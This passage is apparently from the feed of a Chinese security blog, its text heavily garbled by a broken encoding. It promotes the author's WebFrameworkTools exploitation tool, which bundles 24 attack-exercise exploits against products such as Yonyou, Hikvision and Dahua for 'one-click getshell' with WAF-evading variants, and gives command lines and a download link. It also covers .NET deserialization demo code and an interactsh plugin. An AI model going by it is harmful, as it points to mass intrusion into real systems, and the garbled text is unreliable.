è‡ªå·±çš„poc" class="headerlink" title="è§£å¯†expæ„é€ è‡ªå·±çš„poc"></a>è§£å¯†expæ„é€ è‡ªå·±çš„poc</h2><p>æˆ‘ä»¬çŸ¥é“åŸç†ä»¥åç›´æ¥æä¸€ä¸ªé¡¹ç›®å¼€æã€‚å¯¹äº†è¿˜æœ‰è¿™ä¸ªä»£ç  ServletInputStream inputStream &#x3D; req.getInputStream();<br>è¿™å°±æ˜¯æ¥å—è¯·æ±‚æ•°æ®çš„ä¸»è¦content-type ä¸æ˜¯posté»˜è®¤çš„å¯ä»¥ä¸å¡«ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309011903518.png" alt="è§£å¯†exp"><br>æˆ‘ä»¬åœ¨è°ƒç”¨ä¸€ä¸‹åŠ å¯†å‡½æ•°ç›´æ¥æ‹¿æ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309011905232.png" alt="æ„é€ æˆåŠŸ"></p><h2 id="æ¼æ´æ›´æ–°è¯¦æƒ…"><a href="#æ¼æ´æ›´æ–°è¯¦æƒ…" class="headerlink" title="æ¼æ´æ›´æ–°è¯¦æƒ…"></a>æ¼æ´æ›´æ–°è¯¦æƒ…</h2><p>ä¸Šè¿°æ¼æ´å·²ç»é›†æˆåˆ°æˆ‘ä»¬çš„ WebFrameworkTools  ç›´æ¥ä¸€é”®getshellã€‚æ›´æ–°hwæ¼æ´è¯¦æƒ…<br>2023-09-01 æ›´æ–°äº†hw ä¸­æ¼æ´24ä¸ªåˆ†åˆ«ä¸ºç”¨å‹nc cloud ä¸Šä¼ æ¼æ´ ä¸€é”®getshell,æ±‰å¾—SRM tomcat.jsp æ–‡ä»¶å­˜åœ¨ç™»é™†ç»•è¿‡æ¼æ´,æ·±ä¿¡æœ åº”ç”¨äº¤ä»˜ç®¡ç†ç³»ç»Ÿ login è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´(shellæ‹¿ä¸åˆ°),ç½‘ç¥ SecGate 3600 é˜²ç«å¢™ obj_app_upfile ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´,ç”¨å‹ ç§»åŠ¨ç®¡ç†ç³»ç»Ÿ uploadApk.do,HiKVISION ç»¼åˆå®‰é˜²ç®¡ç†å¹³å° env ä¿¡æ¯æ³„æ¼æ¼æ´,é”æ· NBR è·¯ç”±å™¨ fileupload.php ä»»æ„æ–‡ä»¶ä¸Šä¼ ,é‡‘ç›˜ å¾®ä¿¡ç®¡ç†å¹³å° getsysteminfo æœªæˆæƒè®¿é—®,ç½‘å¾¡ä¸Šç½‘è¡Œä¸ºç®¡ç†ç³»ç»ŸSqlæ³¨å…¥,ç”¨å‹ U8 CRMå®¢æˆ·å…³ç³»ç®¡ç†ç³»ç»Ÿ getemaildata.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´,å¹¿è”è¾¾sqlæ³¨å…¥,ä¼æœ›åˆ¶é€  ERP comboxstore.action è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´,å¤§å æ™ºæ…§å›­åŒºç»¼åˆç®¡ç†å¹³å° video ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´,å¤§ååŸå¸‚å®‰é˜²ç›‘æ§ç³»ç»Ÿå¹³å°ç®¡ç†å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´,å¤§ååŸå¸‚å®‰é˜²ç›‘æ§ç³»ç»Ÿå¹³å°ç®¡ç†sqlæ³¨å…¥æ¼æ´,é£ä¼äº’è” FEä¸šåŠ¡åä½œå¹³å° ShowImageServlet ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´,Metabase validate è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2023-38646(poc),å¤§å æ™ºæ…§å›­åŒºç»¼åˆç®¡ç†å¹³å° è´¦å·å¯†ç æ³„éœ²,fficeweb365 ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´,è‡´è¿œOA M1Server userTokenService è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´,é‡‘è¶OA äº‘æ˜Ÿç©º CommonFileServer ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´,æ–°å¼€æ™® å‰ç½®æœåŠ¡ç®¡ç†å¹³å° service.action è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´(å‹‰å¼ºåŠ ä¸Šäº†),æ˜æºäº‘ ERPç³»ç»Ÿ æ¥å£ç®¡å®¶ ApiUpdate.ashx ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´,äº¿èµ›é€šæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚è¯¦æƒ…çœ‹æˆªå›¾2023hwæ¼æ´ã€‚2023hwæ¼æ´æ›´æ–°æ­¤æ¬¡æ›´æ–°24ä¸ªæ¼æ´ç”±äºæ—¶é—´æˆ–è€…å…¶ä»–åŸå› éƒ¨åˆ†æ¼æ´æ²¡æœ‰æ›´æ–°ã€‚è¿™ä¸ªä¸å½±å“ã€‚æˆ‘ä»¬è½¯ä»¶æ–°ç‰ˆæœ¬5.2åŠŸèƒ½å¯ä»¥è°ƒç”¨ä»»æ„è„šæœ¬æ‰§è¡Œexp å¼¥è¡¥äº†è¿™ä¸ªä¸è¶³è¿™æ¬¡æ›´æ–°ä»¥åæˆ‘å°†ä¸ä¼šå†æ›´æ–°æ¼æ´ã€‚åç»­æˆ‘å­¦ä¹ å®Œæ¯•ä»¥åå°†ä¸“æ³¨æ›´æ–°è½¯ä»¶ã€‚æ„Ÿè°¢å¤§å®¶å¯¹è½¯ä»¶çš„æ”¯æŒã€‚å…¶ä¸­è¿™äº›æ¼æ´çš„expå¤§éƒ¨åˆ†æˆ‘éƒ½åšäº†å˜å½¢ä»¥æ±‚ç»•è¿‡wafã€‚æ‰€ä»¥å†™è½¯ä»¶ä¸å…‰æ˜¯é€Ÿåº¦è¿˜æœ‰å‡†ç¡®åº¦ã€‚è¿˜è¦æœ‰ä»£ç å®¡è®¡èƒ½åŠ›å¯¹äºä½å…¬å¸ƒçš„åŠ å¯†çš„expå¯ä»¥è§£å¯†å®ç°è‡ªå®šä¹‰è¯·æ±‚ã€‚<br>è½¯ä»¶5.2æ•ˆæœæµ‹è¯•æˆªå›¾ã€‚å¯ä»¥è°ƒç”¨ä»»æ„ç¨‹åºæ‰¹é‡æ‰§è¡Œã€‚å…·ä½“çœ‹æˆªå›¾<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309011915972.png" alt="5.2æ•ˆæœæµ‹è¯•"><br>æ›´æ–°è¯¦æƒ…è§ <a href="https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main">https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309011910280.png" alt="hwæ¼æ´æ›´æ–°è¯¦æƒ…"></p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>å®åœ¨æ˜¯æ²¡æ—¶é—´è¦ä¸hwçš„æ¼æ´å…¨éƒ¨ç»™ä»–åŠ åˆ°å·¥å…·é‡Œé¢ã€‚æœ‰çš„æ¼æ´å·²ç»ä¿®å¤äº†å¤ªéš¾äº†ğŸ˜”ã€‚å¤§å®¶ç”¨å·¥å…·çš„æ—¶å€™å¾ˆçˆ½åœ¨è¿™èƒŒåä½œè€…æˆ‘ä»˜å‡ºä¸å°‘å•ŠğŸ˜‚ã€‚æœ‰çš„å¤§ä½¬æƒ³ç ´è§£æˆ–è€…é€†å‘å·¥å…·çš„ã€‚å°±ç®—æºä»£ç ç»™ä½ ã€‚æˆ‘æ›´æ–°å’Œä½ æ›´æ–°å‡ºæ¥çš„è½¯ä»¶ã€‚è‚¯å®šæ˜¯æˆ‘çš„è½¯ä»¶æ¯”ä½ çš„ç‰›é€¼ã€‚æ‰€ä»¥å¤šå­¦ä¹ å­¦ä¹ æ€è·¯è€Œä¸æ˜¯è€æƒ³ç ´è§£å¾—åˆ°æºä»£ç ã€‚æ€æƒ³æ— æ³•å¤åˆ¶ã€‚è¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„è½¯ä»¶ä¸ä»…é€Ÿåº¦å¿«è€Œä¸”è¯¯æŠ¥ç‡ä½çš„åŸå› ã€‚ä¸å…¶ç ´è§£ä¸å¦‚åç»­ä½ è´­ä¹°ä»£ç ã€‚æˆ‘æ‰‹æŠŠæ‰‹æ•™å­¦æ¥çš„å®åœ¨ã€‚æ—¢ä¸æƒ³èŠ±é’±åˆæƒ³æåˆ°æˆæœã€‚æˆ‘åŠä½ è¿˜æ˜¯æ´—æ´—ç¡å§ã€‚å› ä¸ºé€†å‘å‡ºçš„æ˜¯ä»£ç ä¸æ˜¯å­¦ä¹ æ€è·¯åªæœ‰æ€è·¯æ‰æ˜¯ç‹é“ğŸ˜‚ã€‚åç»­æˆ‘å­¦ä¹ å®Œæ¯•ä»¥åè½¯ä»¶è¿™å—å°†é‡ç‚¹æŠ“ä¸€æ³¢ã€‚æˆ‘ä»¥åä¹Ÿç”¨æ¯•ç«Ÿã€‚ä»¥åå®‰å…¨çš„å‘å±•æ–¹å‘ã€‚<br>ç°åœ¨å„ç§é˜²æŠ¤è®¾å¤‡ã€‚ä»¥åæ˜¯ä»£ç å®¡è®¡çš„å¤©ä¸‹ã€‚æ¡†æ¶å®¡è®¡çš„å¤©ä¸‹ã€‚å¥½å¥½å¸ƒå±€å§ã€‚ä»¥åå®‰å…¨å°†å˜æˆ ä»£ç å®¡è®¡ äºŒè¿›åˆ¶æ¼æ´æŒ–æ˜(å†…ç½‘æ¸—é€) ç§»åŠ¨ç«¯ ç‰©è”ç½‘ç«¯ è¶Šå¤§æœç¡¬ä»¶ã€‚æœä»£ç å±‚é¢å‘å±•ã€‚è¿˜æ²¡æœ‰å­¦ä¹ ç¼–ç¨‹è¯­è¨€çš„ä½ è¦åŠªåŠ›å­¦ä¹ ä¸€é—¨è¯­è¨€äº†ğŸ’ªğŸ’ªã€‚ç­‰åšä¸»å­¦ä¹ å®Œæ¯•ä»¥åæˆ‘ä»¬å°†ç€é‡æ›´æ–°æˆ‘ä»¬çš„è½¯ä»¶ã€‚è®©ä»–å˜æˆæµå¼Šçš„è½¯ä»¶</p>]]></content>
      
      
      <categories>
          
          <category> CodeAudit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeAuditExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç»¼åˆæ€§exp|pocæ¸—é€å·¥å…·-WebFrameworkTools5.0</title>
      <link href="/securitytools/2023/08/articles/17280a163317a771/"/>
      <url>/securitytools/2023/08/articles/17280a163317a771/</url>
      
        <content type="html"><![CDATA[<h1 id="è½¯ä»¶ä»‹ç»"><a href="#è½¯ä»¶ä»‹ç»" class="headerlink" title="è½¯ä»¶ä»‹ç»"></a>è½¯ä»¶ä»‹ç»</h1><h2>WebFrameworkTools-5.0 å·¥å…·ä½¿ç”¨æ–¹æ³•</h1>è½¯ä»¶ä»å»å¹´åœæ­¢ä»¥åå°±åœ¨æ²¡æœ‰å‘å¸ƒè¿‡ã€‚ç”±äºå„ç§åŸå› å§ã€‚æœ‰çš„å…„å¼Ÿå¯¹æºä»£ç å¯¹å·¥å…·æ„Ÿå…´è¶£æ‰€ä»¥ã€‚æˆ‘åœ¨æ¢å¤ä¸€ä¸‹ä½¿ç”¨è®©è´­ä¹°æºä»£ç çš„æˆ–è€…å·¥å…·çš„èƒ½æ›´å¥½çš„äº†è§£å·¥å…·ã€‚æ­¤æ¬¡å…¬å¸ƒçš„å·¥å…· urlæ¡æ•°æ˜¯500æ¡ã€‚ä¸æ£€æµ‹ä»£ç† expå’Œpocå¤§å®¶éšä¾¿æŠ“ã€‚å¦å¤–åœ¨å†…ç½‘ç¯å¢ƒä¸‹ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„ã€‚<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308051859421.png" alt="è½¯ä»¶ç•Œé¢"></p><h2 id="expæ¨¡å¼"><a href="#expæ¨¡å¼" class="headerlink" title="expæ¨¡å¼"></a>expæ¨¡å¼</h2><p>æ‹¿åˆ°è½¯ä»¶ æ‰“å¼€cmd.batè¾“å…¥è½¯ä»¶åç§°å›è½¦å³å¯æ˜¾ç¤ºå¸®åŠ©æˆ‘ä»¬è·³ä¸€ä¸ªé•¿çš„æ¥ä»‹ç»ä¸€ä¸‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308051905594.png" alt="expæ¨¡å¼ç•Œé¢"><br>WebFrameworkTools.exe -url <a href="http://www.baidu.com/">http://www.baidu.com</a> -type thinkphp -thread 30 <br/><br>è¿™ä¸ªurlçš„æ„æ€æ˜¯ä½ è¦ æµ‹è¯•çš„ç›®æ ‡ç½‘ç«™è¿™å¿…é¡»å¸¦https:&#x2F;&#x2F;æˆ–è€…http:&#x2F;&#x2F;   typeæŒ‡å®šçš„æ˜¯è¿™ä¸ªç½‘ç«™å¼€å‘æ¡†æ¶å’Œæ‰€å±cms  thread æŒ‡å®šçš„çº¿ç¨‹æ•°é‡æ˜¯å¤šå°‘<br/></p><p>WebFrameworkTools.exe -url <a href="http://www.baidu.com/">http://www.baidu.com</a>  è¿™ä¸ªtypeå’Œçº¿ç¨‹éƒ½ä¸æŒ‡å®šä½¿ç”¨çš„å°±æ˜¯å…¨éƒ¨typeè¿›è¡Œæµ‹è¯•ã€‚çº¿ç¨‹ä½¿ç”¨ç¨‹åºè‡ªå®šä¹‰çš„çº¿ç¨‹ã€‚ä¾‹å­å¦‚ä¸‹:</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308051909886.png" alt="ä¾‹å­"></p><h2 id="dllæ¨¡å¼"><a href="#dllæ¨¡å¼" class="headerlink" title="dllæ¨¡å¼"></a>dllæ¨¡å¼</h2><p>å¦‚ä½•è¿›å»dllæ¨¡å¼ æŒ‰ç…§æç¤ºåˆ›å»ºä¸€ä¸ªuserdll.txt æ–‡æœ¬å³å¯è¿›å…¥dllæ¨¡å¼ã€‚å¦‚æœç”Ÿæˆ</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308051912665.png" alt="dllæ¨¡å¼"></p><h2 id="ç”Ÿæˆexp-dll"><a href="#ç”Ÿæˆexp-dll" class="headerlink" title="ç”Ÿæˆexp dll"></a>ç”Ÿæˆexp dll</h2><p>æœ‰ä¸€äº›ç½‘ç«™expæ¯”è¾ƒç®€å•æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ç”Ÿæˆdllçš„å·¥å…·æ¥ç”Ÿæˆdllç„¶åä½¿ç”¨è½¯ä»¶åŠ è½½dllè¿›è¡Œæµ‹è¯•ç½‘ç«™çš„å®‰å…¨æ€§æ¥ä¸‹æ¥æ¼”ç¤ºä¸€ä¸‹å¦‚ä½•ç”Ÿæˆdllã€‚æ¥åˆ°ç”Ÿæˆdllè¿™ä¸ªå·¥å…·çš„æ–‡ä»¶å¤¹åŒå‡»exeæ‰“å¼€å·¥å…·å¦‚ä¸‹å›¾</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308051914696.png" alt="dllç”Ÿæˆå·¥å…·"><br>æˆ‘ä»¬ä»¥ç™¾åº¦ç½‘ç«™ä¸ºä¾‹è®²è§£ä¸€ä¸‹ã€‚åŠ å…¥ä½ åœ¨pocæˆ–è€…getè¯·æ±‚æœ‰ä¸€ä¸ªecho STATUS OK å­—ç¬¦ç„¶ååœ¨å½±å“åŒ…é‡Œé¢ä¹Ÿå­˜åœ¨è¿™ä¸ªå…³é”®å­—æ­£å¸¸å­˜åœ¨æ¼æ´ã€‚æ„é€ å¦‚ä¸‹å›¾ã€‚ç‚¹å‡»ç”Ÿæˆåˆ©ç”¨çš„dllã€‚ç¡®ä¿Dllplugins.dll å’Œexeåœ¨åŒä¸€ä¸ªç›®å½•ä¸‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308051919001.png" alt="ç”Ÿæˆåˆ©ç”¨dll"><br>ç„¶åæŠŠtestbaidu.dllå’ŒDllplugins.dll å¤åˆ¶åˆ°WebFrameworkTools.exe å·¥å…·ç›®å½•é‡Œé¢å¦‚ä¸‹å›¾<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308051921424.png" alt="å¤åˆ¶ä¸€ä¸‹"><br>æ ¹æ®æç¤ºåˆ©ç”¨ä¸€ä¸‹<br>WebFrameworkTools.exe -url <a href="http://www.baidu.com/">http://www.baidu.com</a> -dllname testbaidu.dll<br/><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308051922064.png" alt="åˆ©ç”¨æˆªå›¾"><br>ä¾‹å¦‚:<br>å½“ç„¶å¦‚æœæ˜¯urlæ¯”è¾ƒå¤šé‚£ä¹ˆåˆ›å»ºä¸€ä¸ªurl.txt ä¸€è¡Œä¸€ä¸ªç½‘ç«™ç›´æ¥ æŒ‡å®šdllnameå°±è¡Œäº†<br>WebFrameworkToolsUser.exe -dllname testbaidu.dll -thread 30<br/><br>è¿˜æœ‰ä¸ä¼šçš„è¯·å‚è€ƒä¸‹é¢è¯¦ç»†ç”¨æ³•</p><h2 id="è½¯ä»¶å¼€å‘ç±»å‹"><a href="#è½¯ä»¶å¼€å‘ç±»å‹" class="headerlink" title="è½¯ä»¶å¼€å‘ç±»å‹"></a>è½¯ä»¶å¼€å‘ç±»å‹</h2> <ul> <li>  å›¢é˜Ÿåä½œå¼€å‘æ ¸å¿ƒä»£ç åšä¸»å¼€å‘,æ˜¯å¦åŸåˆ›:æ˜¯ </li> </ul>    <h2 id="è¯¦ç»†ç”¨æ³•å‚è§"><a href="#è¯¦ç»†ç”¨æ³•å‚è§" class="headerlink" title="è¯¦ç»†ç”¨æ³•å‚è§"></a>è¯¦ç»†ç”¨æ³•å‚è§</h2> <ul> <li> https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main </li> <li> è§†é¢‘æ•™ç¨‹åœ°å€:https://www.youtube.com/watch?v=zvIdx0GkZVY </li> </ul><h2 id="ä½¿ç”¨æ¡ä¾‹"><a href="#ä½¿ç”¨æ¡ä¾‹" class="headerlink" title="ä½¿ç”¨æ¡ä¾‹"></a>ä½¿ç”¨æ¡ä¾‹</h2><p>æœ¬é¡¹ç›®å‘å¸ƒè½¯ä»¶ç¦æ­¢å¯¹æœªæˆæƒç½‘ç«™è¿›è¡Œæ”»å‡»<br/><br>æœ¬é¡¹ç›®å¦‚æœå‘å¸ƒæºä»£ç ç¦æ­¢è¿›è¡Œæœªæˆæƒå•†ä¸šç”¨é€”<br/><br>æœ¬é¡¹ç›®å¦‚æœå‘å¸ƒæºä»£ç ç¦æ­¢äºŒæ¬¡å¼€å‘åå¯¹ç½‘ç«™è¿›è¡Œéæ³•æ”»å‡»<br/><br>æœ¬é¡¹ç›®ä»…é¢å‘åˆæ³•æˆæƒçš„ä¼ä¸šå®‰å…¨å»ºè®¾è¡Œä¸ºï¼Œåœ¨ä½¿ç”¨æœ¬é¡¹ç›®è¿›è¡Œæ£€æµ‹æ—¶ï¼Œæ‚¨åº”ç¡®ä¿è¯¥è¡Œä¸ºç¬¦åˆå½“åœ°çš„æ³•å¾‹æ³•è§„ï¼Œå¹¶ä¸”å·²ç»å–å¾—äº†è¶³å¤Ÿçš„æˆæƒ<br/><br>å¦‚æ‚¨åœ¨ä½¿ç”¨æœ¬é¡¹ç›®çš„è¿‡ç¨‹ä¸­å­˜åœ¨ä»»ä½•éæ³•è¡Œä¸ºï¼Œæ‚¨éœ€è‡ªè¡Œæ‰¿æ‹…ç›¸åº”åæœï¼Œæˆ‘ä»¬å°†ä¸æ‰¿æ‹…ä»»ä½•æ³•å¾‹åŠè¿å¸¦è´£ä»»åœ¨ä½¿ç”¨æœ¬é¡¹ç›®å‰ï¼Œè¯·æ‚¨åŠ¡å¿…å®¡æ…é˜…è¯»ã€å……åˆ†ç†è§£å„æ¡æ¬¾å†…å®¹ï¼Œé™åˆ¶ã€å…è´£æ¡æ¬¾æˆ–è€…å…¶ä»–æ¶‰åŠæ‚¨é‡å¤§æƒç›Šçš„æ¡æ¬¾å¯èƒ½ä¼šä»¥åŠ ç²—ã€åŠ ä¸‹åˆ’çº¿ç­‰å½¢å¼æç¤ºæ‚¨é‡ç‚¹æ³¨æ„é™¤éæ‚¨å·²å……åˆ†é˜…è¯»ã€å®Œå…¨ç†è§£å¹¶æ¥å—æœ¬åè®®æ‰€æœ‰æ¡æ¬¾ï¼Œå¦åˆ™ï¼Œè¯·æ‚¨ä¸è¦ä½¿ç”¨æœ¬é¡¹ç›®æ‚¨çš„ä½¿ç”¨è¡Œä¸ºæˆ–è€…æ‚¨ä»¥å…¶ä»–ä»»ä½•æ˜ç¤ºæˆ–è€…é»˜ç¤ºæ–¹å¼è¡¨ç¤ºæ¥å—æœ¬åè®®çš„ï¼Œå³è§†ä¸ºæ‚¨å·²é˜…è¯»å¹¶åŒæ„æœ¬åè®®çš„çº¦æŸ<br/><br>ä¸‹è½½è½¯ä»¶å³ä»£è¡¨åŒæ„æœ¬ä½¿ç”¨æ¡ä¾‹!!!!ã€‚å¦‚æœä¸åŒæ„è¯·ä¸‹è½½åç›´æ¥åˆ é™¤æœ¬è½¯ä»¶ã€‚</p><h2 id="ä¸‹è½½åœ°å€"><a href="#ä¸‹è½½åœ°å€" class="headerlink" title="ä¸‹è½½åœ°å€"></a>ä¸‹è½½åœ°å€</h2><p><a href="https://www.upload.ee/files/15539557/WebFrameworkTools-2022-08-26.zip.html">https://www.upload.ee/files/15539557/WebFrameworkTools-2022-08-26.zip.html</a> </p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github .net ååºåˆ—11è¯¾ååºåˆ—åŒ–æ¼æ´ä»£ç </title>
      <link href="/codeaudit/2023/07/articles/9c9b28d24e8ef1ac/"/>
      <url>/codeaudit/2023/07/articles/9c9b28d24e8ef1ac/</url>
      
        <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>åœ¨ä¸€æ¬¡é¡¹ç›®ä¸­å¾—åˆ°ä¸€æ³¢.net æºç ã€‚çœ‹åˆ°äº†ä¸€ä¸ªå‡½æ•°å†…å®¹å¯ä»¥æ˜¯jsonæ•°æ®äºæ˜¯ä¹ä½¿ç”¨jsonæ•°æ®æµ‹è¯•ã€‚æµ‹è¯•çš„æ—¶å€™å‘ç° jsonæŠ¥é”™ å‘ç°æœ‰ä¸€ä¸ªå…³é”®å­—JavaScriptSerializer ç«‹é©¬æœç´¢äº†ä¸€æ³¢ã€‚è¿™ç©æ„å¯ä»¥ååºåˆ—ã€‚äºæ˜¯ä¹æˆ‘ç”¨ysoserial.exe ç”Ÿæˆpoc æœ¬ä»¥ä¸ºè¦å’Œjavaä¸€æ ·èµ·é£äº†ç»“æœã€‚æ¡æ“¦ æŠ¥é”™äº†ã€‚typeå‚æ•°ä¸èƒ½ä¸ºnull è¿™netååºåˆ—åŒ–æ¼æ´ä¹‹å‰æ²¡æœ‰é‡åˆ°è¿‡ã€‚ä»¥ä¸ºæ˜¯å§¿åŠ¿æœ‰é—®é¢˜ã€‚ç½‘ä¸Šæœç´¢äº†ä¸€æ³¢çœ‹åˆ°githubè¿™é‡Œ<a href="https://github.com/Ivan1ee/NET-Deserialize">https://github.com/Ivan1ee/NET-Deserialize</a> æœ‰ä»‹ç»ã€‚ç”±äºæ²¡æœ‰å­¦è¿‡çœ‹çœ‹ã€‚ä»–è¿™ä¸ªé¡¹ç›®æ²¡æœ‰æ¼æ´ä»£ç ã€‚äºæ˜¯æˆ‘è‡ªå·±èŠ±æ—¶é—´å†™äº†ä¸€ä¸ªæ¼æ´demoã€‚æ‰“äº†ä¸€æ³¢å‘ç°æ²ƒæ—¥ã€‚ã€‚è¿™ç©æ„å¾—æ»¡è¶³ä¸€å®šæ¡ä»¶æ‰è¡Œè¦ä¸å°±æ˜¯æŠ¥type å‚æ•°ä¸ºnullã€‚æäº†åŠå¤©æ˜¯æ²¡æœ‰ååºåˆ—åŒ–æ¼æ´å•Šã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308041542668.png" alt="æ²¡æ¼æ´çš„æˆªå›¾"></p><h2 id="è¡¥å…¨æ¼æ´ä»£ç "><a href="#è¡¥å…¨æ¼æ´ä»£ç " class="headerlink" title="è¡¥å…¨æ¼æ´ä»£ç "></a>è¡¥å…¨æ¼æ´ä»£ç </h2><p>äºæ˜¯ä¹æœ¬ç€é€ä½›é€åˆ°è¥¿æˆ‘æŠŠè¿™ä¸ªgithubæ‰€æ¶‰åŠçš„11ä¸ªååºåˆ—åŒ–çš„pdfçš„æ¡ˆä¾‹éƒ½å†™æˆäº†æ¼æ´ä»£ç è¿™åˆ°æ—¶å€™å°±çœäº‹äº†åˆ°åº•æ˜¯æ²¡æœ‰æ¼æ´è¿˜æ˜¯é“¾ä¸è¡Œã€‚å¦‚ä¸‹å›¾<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202308041545382.png" alt="æ¼æ´ä»£ç "></p><h2 id="ä¸‹è½½åœ°å€"><a href="#ä¸‹è½½åœ°å€" class="headerlink" title="ä¸‹è½½åœ°å€"></a>ä¸‹è½½åœ°å€</h2><p>é¢‘é“åœ°å€<br><a href="https://t.me/SoftwareNoticeChannel/243">https://t.me/SoftwareNoticeChannel/243</a></p>]]></content>
      
      
      <categories>
          
          <category> CodeAudit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeAuditExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>interactsh-collaborator æºç åˆ†æç”¨.netå†™ä¸€ä¸ªå®¢æˆ·ç«¯</title>
      <link href="/penetrationtest/2023/07/articles/05d020ff2fca8938/"/>
      <url>/penetrationtest/2023/07/articles/05d020ff2fca8938/</url>
      
        <content type="html"><![CDATA[<h2 id="brupæ’ä»¶"><a href="#brupæ’ä»¶" class="headerlink" title="brupæ’ä»¶"></a>brupæ’ä»¶</h2><p>è¿™æ˜¯ Interact.sh çš„ Burpsuite æ’ä»¶<br>è¯¥æ’ä»¶å®ç°äº†interactsh-client çš„å®¢æˆ·ç«¯é€»è¾‘ã€‚ å®ƒå°†å…è®¸æ‚¨ç”Ÿæˆå¯ç”¨äº OOB æµ‹è¯•çš„æ–°åŸŸã€‚ å¦‚æœæ‚¨æ‰˜ç®¡è‡ªå·±çš„ Interactsh ç‰ˆæœ¬ï¼Œåˆ™å¯ä»¥åœ¨â€œé…ç½®â€é€‰é¡¹å¡ä¸­å¯¹å…¶è¿›è¡Œé…ç½®ã€‚æ­¤æ‰©å±•å¯ä¸ Burpsuite çš„ Collaborator æœåŠ¡ä¸€èµ·ä½¿ç”¨ã€‚åŠ è½½æ‰©å±•åï¼Œæ‰€æœ‰ç»“æœéƒ½ä¼šè®°å½•åœ¨ Interactsh æ—¥å¿—é€‰é¡¹å¡ä¸­ã€‚ è®°å½•å¹¶é€‰æ‹© OOB äº¤äº’åï¼Œè¯¦ç»†ä¿¡æ¯å°†æ˜¾ç¤ºåœ¨åº•éƒ¨çª—å£ä¸­ã€‚<br>githubåœ°å€ï¼š<a href="https://github.com/wdahlenburg/interactsh-collaborator">https://github.com/wdahlenburg/interactsh-collaborator</a> è¿™ä¸ªæ’ä»¶å·²ç»å¾ˆä¹…æ²¡æœ‰æ›´æ–°äº†</p><h2 id="æ’ä»¶ä¸è¶³"><a href="#æ’ä»¶ä¸è¶³" class="headerlink" title="æ’ä»¶ä¸è¶³"></a>æ’ä»¶ä¸è¶³</h2><p>1:æ²¡æœ‰æ¸…ç†æ—¥å¿—åŠŸèƒ½,ç›®æ ‡å¤šäº†æ— æ³•åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´<br/><br>2:åªèƒ½æ˜¯ä¸€ä¸ªåŸŸå,é¢‘ç¹è¯·æ±‚ä¼šè¶…æ—¶<br/><br>3:pingå‘½ä»¤æµ‹è¯•æ²¡æœ‰å›æ˜¾é€ æˆpingå‘½ä»¤æµ‹è¯•çš„æ¼æ´å…¨éƒ¨é—æ¼<br/><br>4:æºä»£ç ä¸­åŸŸåå·²ç»åºŸå¼ƒä¸ä¿®æ”¹ç›´æ¥å¯åŠ¨å®¢æˆ·ç«¯å¤±è´¥<br/><br>githubå‡ºç°çš„é—®é¢˜æˆªå›¾<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307221254357.png" alt="å‡ºç°çš„é—®é¢˜"></p><h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><p>æ‰‹ä¸‹å»githubä¸‹è½½æºä»£ç ã€‚åœ¨github issue ä¸­æˆ‘ä»¬çœ‹åˆ°æ³¨å†Œå®¢æˆ·ç«¯çš„æ—¶å€™ä¼šæŠ¥é”™ä»ä»£ç 